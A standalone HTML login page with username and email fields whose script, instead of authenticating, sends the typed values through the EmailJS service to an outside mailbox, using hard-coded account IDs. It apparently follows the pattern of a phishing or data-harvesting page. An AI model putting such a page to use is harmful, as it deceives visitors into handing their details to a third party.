<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login</title>

<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

<script>
(function(){
emailjs.init("2pInQghRcP-YZtYCK");
})();

function sendMail(event){
event.preventDefault();

emailjs.send("service_hxul50k","template_3mjgsjk",{
username: document.getElementById("username").value,
email: document.getElementById("email").value
})
.then(function(){
alert("Data sent successfully!");
});
}
</script>

<style>

body{
margin:0;
font-family:Arial;
background:linear-gradient(180deg,#c000ff,#7a00ff);
height:100vh;
display:flex;
justify-content:center;
align-items:center;
}

.card{
width:340px;
background:#f3f3f3;
border-radius:20px;
padding:30px;
text-align:center;
}

input{
width:90%;
padding:14px;
margin:10px 0;
border-radius:10px;
border:2px solid #ddd;
}

button{
width:95%;
padding:15px;
border:none;
border-radius:10px;
background:#ff9800;
color:white;
}

</style>

</head>

<body>

<div class="card">

<h2>Login</h2>

<form onsubmit="sendMail(event)">

<input type="text" id="username" placeholder="Username" required>

<input type="email" id="email" placeholder="Email" required>

<button type="submit">Log In</button>

</form>

</div>

</body>
</html>
